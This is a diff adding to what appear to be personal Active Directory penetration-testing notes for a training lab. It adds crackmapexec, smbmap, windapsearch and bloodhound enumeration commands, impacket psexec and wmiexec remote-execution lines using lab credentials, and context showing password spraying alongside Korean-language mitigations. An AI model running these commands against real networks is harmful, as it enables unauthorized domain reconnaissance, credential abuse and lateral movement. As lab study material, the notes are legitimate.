@@ -96,7 +96,9 @@ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 ```
 rpcclient -U "" -N 172.16.5.5
 
-rpcclient $> enumdomusers 
+rpcclient $> enumdomusers
+
+rpcclient $> queryuser 0x457
 ```
 ```bash
 crackmapexec smb 172.16.5.5 --users
@@ -147,3 +149,37 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 - 접근 제한 — 최소 권한 원칙에 따라 실제로 필요한 사용자에게만 애플리케이션 접근 허용
 - 피해 최소화 — 관리자 계정 분리, 권한 세분화, 네트워크 분리(세그멘테이션)로 침해 범위 제한
 - 비밀번호 위생 — 패스프레이즈 사용 권장, 사전 단어·계절·회사명 등 흔한 조합 필터링으로 추측 어렵게 만들기
+
+
+## Enumerate
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+```bash
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+```
+```bash
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+```bash
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+```
+
+## impacket
+```bash
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+```
